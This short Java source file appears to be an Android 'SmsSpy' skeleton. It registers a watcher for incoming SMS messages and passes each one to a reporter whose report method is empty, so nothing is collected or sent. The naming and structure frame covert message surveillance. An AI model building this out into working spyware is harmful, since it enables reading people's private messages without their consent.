package org.ddth.android.spy;

import java.util.Date;

import org.ddth.android.monitor.observer.AndroidSmsWatcher;
import org.ddth.mobile.monitor.core.Reporter;
import org.ddth.mobile.monitor.report.SMS;

public class SmsSpy {

	public void spy() {
		AndroidSmsWatcher watcher = new AndroidSmsWatcher();
		watcher.register(new SmsSpyReporter<SMS>());
		watcher.start(null);
	}
}

class SMSE extends SMS {
	public SMSE(String from, String to, String message, Date date) {
		super(from, to, message, date);
	}
}

class SmsSpyReporter<T extends SMS> implements Reporter<T> {

	@Override
	public void report(T sms) {
		
	}
}